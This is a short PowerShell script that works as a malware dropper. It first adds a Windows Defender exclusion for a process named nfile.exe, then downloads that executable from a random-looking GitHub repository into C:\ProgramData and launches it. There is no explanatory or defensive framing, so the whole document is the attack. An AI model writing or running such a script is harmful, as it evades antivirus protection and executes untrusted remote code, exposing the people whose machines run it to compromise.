Add-MpPreference -ExclusionProcess "nfile.exe"
mkdir C:\ProgramData\File65
$source = 'https://raw.githubusercontent.com/RedTheMenace/tergj9se4g3glkedrg/main/nfile.exe'
$destination = 'C:\ProgramData\File65\nfile.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
Start-Process C:\ProgramData\File65\nfile.exe
